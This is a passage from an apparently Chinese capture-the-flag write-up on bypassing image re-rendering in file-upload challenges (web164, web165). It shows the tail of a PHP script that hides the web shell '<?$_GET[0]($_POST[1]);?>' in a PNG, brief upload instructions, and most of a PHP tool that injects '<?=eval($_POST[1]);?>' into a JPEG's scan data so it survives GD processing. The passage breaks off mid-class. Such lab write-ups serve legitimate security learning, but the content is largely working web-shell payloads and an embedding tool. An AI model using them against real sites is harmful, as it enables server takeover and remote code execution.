<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0x66</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x44</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x50</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x33</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$img</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">imagecreatetruecolor</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#dcdcaa">sizeof</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">); </span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4"> += </span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$g</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4">+</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4">+</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$color</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">imagecolorallocate</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$img</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$g</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#dcdcaa">imagesetpixel</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$img</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">round</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$y</span><span style="color:#d4d4d4"> / </span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">), </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$color</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">imagepng</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$img</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'kk.png'</span><span style="color:#d4d4d4">);  </span><span style="color:#6a9955">//要修改的图片的路径</span></span>
<span class="line"><span style="color:#6a9955">/* 木马内容</span></span>
<span class="line"><span style="color:#6a9955">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span>
<span class="line"><span style="color:#6a9955"> */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>得到被插入代码的图片之后直接上传，然后查看图片，使用 hackbar</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071251204.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107125140779"></p><p>然后下载图片查看即可。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071255533.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107125522421"></p><h3 id="web165jpg二次渲染"><a class="markdownIt-Anchor" href="#web165jpg二次渲染"></a> web165（jpg 二次渲染）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$miniPayload</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"&lt;?=eval(</span><span style="color:#d7ba7d">\$</span><span style="color:#ce9178">_POST[1]);?&gt;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">extension_loaded</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'gd'</span><span style="color:#d4d4d4">) || !</span><span style="color:#dcdcaa">function_exists</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'imagecreatefromjpeg'</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'php-gd is not installed'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">set_error_handler</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"custom_error_handler"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$pad</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$pad</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#b5cea8">1024</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$pad</span><span style="color:#d4d4d4">++) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$nullbytePayloadSize</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$pad</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">DataInputStream</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$extraBytes</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">readShort</span><span style="color:#d4d4d4">() != </span><span style="color:#b5cea8">0xFFD8</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Incorrect SOI marker'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">while</span><span style="color:#d4d4d4">((!</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">eof</span><span style="color:#d4d4d4">()) &amp;&amp; (</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">readByte</span><span style="color:#d4d4d4">() == </span><span style="color:#b5cea8">0xFF</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$marker</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">readByte</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">readShort</span><span style="color:#d4d4d4">() - </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">skip</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$marker</span><span style="color:#d4d4d4"> === </span><span style="color:#b5cea8">0xDA</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">seek</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$outStreamTmp</span><span style="color:#d4d4d4"> = </span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#9cdcfe">$miniPayload</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#dcdcaa">str_repeat</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\0</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$nullbytePayloadSize</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">checkImage</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'_'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">$outStreamTmp</span><span style="color:#d4d4d4">, </span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$extraBytes</span><span style="color:#d4d4d4"> !== </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#c586c0">while</span><span style="color:#d4d4d4">((!</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">eof</span><span style="color:#d4d4d4">())) {</span></span>
<span class="line"><span style="color:#d4d4d4">                        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">readByte</span><span style="color:#d4d4d4">() === </span><span style="color:#b5cea8">0xFF</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">readByte</span><span style="color:#d4d4d4"> !== </span><span style="color:#b5cea8">0x00</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                                </span><span style="color:#c586c0">break</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                            }</span></span>
<span class="line"><span style="color:#d4d4d4">                        }</span></span>
<span class="line"><span style="color:#d4d4d4">                    }</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#9cdcfe">$stopPos</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$dis</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">seek</span><span style="color:#d4d4d4">() - </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#9cdcfe">$imageStreamSize</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$stopPos</span><span style="color:#d4d4d4"> - </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4"> = </span></span>
<span class="line"><span style="color:#d4d4d4">                        </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                        </span><span style="color:#9cdcfe">$miniPayload</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                        </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span></span>
<span class="line"><span style="color:#d4d4d4">                            </span><span style="color:#dcdcaa">str_repeat</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\0</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$nullbytePayloadSize</span><span style="color:#d4d4d4">)</span><span style="color:#d4d4d4">.</span></span>
<span class="line"><span style="color:#d4d4d4">                                </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$startPos</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$imageStreamSize</span><span style="color:#d4d4d4">),</span></span>
<span class="line"><span style="color:#d4d4d4">                            </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">                            </span><span style="color:#9cdcfe">$nullbytePayloadSize</span><span style="color:#d4d4d4">+</span><span style="color:#9cdcfe">$imageStreamSize</span><span style="color:#d4d4d4">-</span><span style="color:#9cdcfe">$extraBytes</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">                                </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$stopPos</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                } </span><span style="color:#c586c0">elseif</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$outStreamTmp</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#c586c0">break</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                }</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">checkImage</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'payload_'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">$outStream</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Success!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#c586c0">break</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                }</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">unlink</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'payload_'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$argv</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Something</span><span style="color:#d7ba7d">\'</span><span style="color:#ce9178">s wrong'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">checkImage</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$data</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$unlink</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">global</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$data</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">imagecreatefromjpeg</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$unlink</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">unlink</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">custom_error_handler</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$errno</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$errstr</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$errfile</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$errline</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">global</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$extraBytes</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$correctImage</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/(</span><span style="color:#d7ba7d">\d</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">) extraneous bytes before marker/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$errstr</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$m</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$m</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$extraBytes</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">int</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$m</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">DataInputStream</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$binData</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$order</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$order</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$fromString</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">''</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">order</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$order</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#9cdcfe">$fromString</span><span style="color:#d4d4d4">) {</span></span>
